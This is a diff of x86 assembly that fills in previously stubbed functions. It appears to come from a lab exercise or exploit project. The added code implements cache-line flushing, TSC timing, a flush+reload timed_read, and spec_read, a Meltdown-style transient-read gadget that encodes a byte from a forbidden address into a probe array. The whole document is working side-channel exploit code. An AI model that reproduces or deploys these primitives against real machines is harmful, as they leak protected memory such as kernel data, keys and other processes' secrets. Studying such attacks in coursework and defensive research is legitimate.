@@ -41,8 +41,9 @@
 .global clflush
 .type	clflush, @function
 clflush:
+	movl		4(%esp),%eax
 	mfence
-	clflush		(%esp + 4)
+	clflush		(%eax)
 	ret
 
 /*
@@ -55,13 +56,6 @@ clflush:
  *
  * Read the 64-bit timestamp counter.
  */
-.global rdtsc64
-.type	rdtsc64, @function
-rdtsc64:
-	rdtsc
-
-	ret
-
 /*
  * uint32_t rdtsc32(void);
  *
@@ -72,12 +66,13 @@ rdtsc64:
  *
  * Read the 64-bit timestamp counter, but discard the upper half.
  */
+.global rdtsc64
+.type	rdtsc64, @function
+rdtsc64:
 .global rdtsc32
 .type	rdtsc32, @function
 rdtsc32:
 	rdtsc
-	xor	%edx, %edx
-
 	ret
 
 /*
@@ -95,19 +90,41 @@ rdtsc32:
 .global	timed_read
 .type	timed_read, @function
 timed_read:
-	/* NOT IMPLEMENTED */
-	xor		%eax, %eax
-	xor		%edx, %edx
+	pushl		%ebp
+	movl		%esp, %ebp
+	pushl		%edi
+	pushl		%ebx
+	movl		8(%ebp), %edi
 
+	mfence
+	lfence
+
+	/* read TSC, combine halves and stash */
+	rdtsc
+	movl		%eax, %ecx
+	movl		%edx, %ebx
+
+	/* access our target */
+	movl		(%edi), %eax
+	lfence
+
+	/* read TSC, combine halves and diff */
+	rdtsc
+	subl		%ecx, %eax
+	sbbl		%ebx, %edx
+
+	popl		%ebx
+	popl		%edi
+	leave
 	ret
 
 /*
  * void spec_read(const uint8_t *addr, const uint8_t *probe, unsigned int shift);
  *
  * entry:
- *      (%esp + 12)	addr
+ *      (%esp + 4)	addr
  *      (%esp + 8)	probe
- *      (%esp + 4)	shift
+ *      (%esp + 12)	shift
  * exit:
  *	-
  *
@@ -116,6 +133,22 @@ timed_read:
 .global spec_read
 .type	spec_read, @function
 spec_read:
-	/* NOT IMPLEMENTED */
+	pushl		%ebp
+	movl		%esp, %ebp
+	pushl		%edi
+	pushl		%esi
+	movl		8(%ebp), %edi
+	movl		12(%ebp), %esi
+	movl		16(%ebp), %ecx
 
+	xorl		%eax, %eax
+1:	movb		(%edi), %al
+	shll		%cl, %eax
+	jz		1b
+
+	movb		(%esi, %eax, 1), %cl
+
+	popl		%esi
+	popl		%edi
+	leave
 	ret
